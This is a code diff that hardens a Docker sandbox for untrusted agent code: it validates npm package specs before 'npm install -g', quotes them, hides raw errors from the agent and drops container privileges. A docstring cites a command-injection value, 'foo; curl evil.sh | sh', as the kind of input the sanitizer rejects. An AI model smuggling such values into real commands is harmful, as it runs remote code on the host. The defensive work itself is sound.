@@ -61,6 +61,38 @@ _DOCKER_STATE_MAP: dict[str, RuntimeState] = {
 
 _SESSION_ID_RE = re.compile(r"^[a-zA-Z0-9_-]+$")
 
+# npm package spec: [@scope/]name[@version-or-range]. Deliberately strict —
+# this string reaches `npm install -g` inside the sandbox, so anything that
+# could be read as a shell metacharacter, an extra argv, or an npm flag
+# (`--registry=...`, `file:...`, `git+...`, `../`) must be rejected up front.
+_NPM_PKG_RE = re.compile(
+    r"^(?:@[a-z0-9][a-z0-9._-]*/)?"          # optional @scope/
+    r"[a-z0-9][a-z0-9._-]{0,213}"            # name (npm max 214 chars)
+    r"(?:@[A-Za-z0-9][A-Za-z0-9.^~<>=|*_\-]{0,63})?$"  # optional @version/range
+)
+
+
+def _sanitize_mcp_packages(packages: list[str]) -> list[str]:
+    """Filter an MCP package list down to safe npm package specs.
+
+    The list is derived from server config that a workspace owner can edit, and
+    it ends up interpolated into `npm install -g` inside the sandbox. A bare
+    join() would let an entry like ``foo; curl evil.sh | sh`` (or ``--registry``)
+    execute arbitrary commands. Reject rather than escape: an escaped-but-weird
+    spec still installs something the operator did not intend.
+    """
+    safe: list[str] = []
+    for pkg in packages:
+        if not isinstance(pkg, str):
+            logger.warning("Rejected non-string MCP package entry", entry=repr(pkg))
+            continue
+        spec = pkg.strip()
+        if not _NPM_PKG_RE.match(spec):
+            logger.warning("Rejected unsafe MCP package spec", package=pkg)
+            continue
+        safe.append(spec)
+    return safe
+
 
 # ---------------------------------------------------------------------------
 # Helpers
@@ -192,7 +224,15 @@ class DockerRuntime(SandboxRuntime):
         except Exception as e:
             if _is_container_gone(e):
                 raise SandboxTransientError(str(e)) from e
-            return ExecResult(stdout="", stderr=str(e), exit_code=-1)
+            # Do not hand the raw exception text to the agent: it routinely
+            # carries sandbox paths, Dockerfile context and host URLs that are
+            # useful for recon. Log it server-side, return an opaque marker.
+            logger.warning("sandbox exec failed: %s", e, exc_info=True)
+            return ExecResult(
+                stdout="",
+                stderr=f"sandbox exec failed ({type(e).__name__}); see server logs",
+                exit_code=-1,
+            )
 
     async def code_run(
         self,
@@ -703,6 +743,14 @@ class DockerProvider(SandboxProvider):
             "NetworkMode": self._config.network_mode,
             "AutoRemove": False,  # We manage removal ourselves
             "Init": True,  # tini as PID 1 for zombie reaping
+            # Least privilege: drop every capability and forbid gaining new
+            # ones. Agent code is untrusted by definition, and the only thing
+            # it legitimately needs is its own filesystem + CPU/RAM budget.
+            "CapDrop": ["ALL"],
+            "SecurityOpt": ["no-new-privileges"],
+            # Fork bombs are the cheapest way to take the host down from
+            # inside a sandbox; cap the process count well below the backend's.
+            "PidsLimit": 512,
         }
 
         # host.docker.internal resolves natively on Docker Desktop but not on
@@ -784,15 +832,24 @@ class DockerProvider(SandboxProvider):
 
         # Install MCP npm packages if needed (mirrors Daytona snapshot behavior)
         if mcp_packages:
-            pkgs = " ".join(mcp_packages)
-            logger.info("Installing MCP packages in Docker container", packages=pkgs)
-            result = await runtime.exec(f"npm install -g {pkgs}", timeout=120)
-            if result.exit_code != 0:
-                logger.warning(
-                    "Failed to install MCP packages (npx will download on demand)",
-                    packages=pkgs,
-                    output=result.stdout,
+            safe_pkgs = _sanitize_mcp_packages(mcp_packages)
+            if safe_pkgs:
+                pkgs = " ".join(safe_pkgs)
+                logger.info(
+                    "Installing MCP packages in Docker container", packages=pkgs
                 )
+                result = await runtime.exec(
+                    "npm install -g " + " ".join(shlex.quote(p) for p in safe_pkgs),
+                    timeout=120,
+                )
+                if result.exit_code != 0:
+                    logger.warning(
+                        "Failed to install MCP packages (npx will download on demand)",
+                        packages=pkgs,
+                        output=result.stdout,
+                    )
+            else:
+                logger.warning("All MCP packages were rejected by the sanitizer")
 
         return runtime
 
